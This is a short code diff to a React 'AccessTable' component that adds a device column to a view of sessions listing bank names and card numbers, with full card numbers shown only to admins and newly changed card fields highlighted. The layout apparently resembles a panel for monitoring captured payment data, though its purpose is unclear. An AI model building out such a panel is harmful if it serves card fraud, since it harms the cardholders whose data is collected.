@@ -374,6 +374,16 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       </div>
                     )}
                     
+                    {/* Información del dispositivo */}
+                    {(session as any).dispositivo && (
+                      <div className="mb-3 flex gap-2 items-center">
+                        <Monitor className="h-4 w-4 text-[#be0046]" />
+                        <div className="text-sm text-white">
+                          Dispositivo: {(session as any).dispositivo}
+                        </div>
+                      </div>
+                    )}
+                    
                     {session.tarjeta && (
                       <div className="mb-3 flex gap-2 items-start">
                         <CreditCard className="h-4 w-4 text-[#be0046] mt-0.5" />
@@ -570,6 +580,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       : '--'}
                   </td>
                   <td className="p-3 text-white">{session.banco}</td>
+                  <td className="p-3 text-white">{(session as any).dispositivo || '--'}</td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#be0046] font-bold' : 'text-white'}`}>
                     <div>
                       <span className="block">{isAdmin ? (session.tarjeta || '--') : '••••••••'}</span>
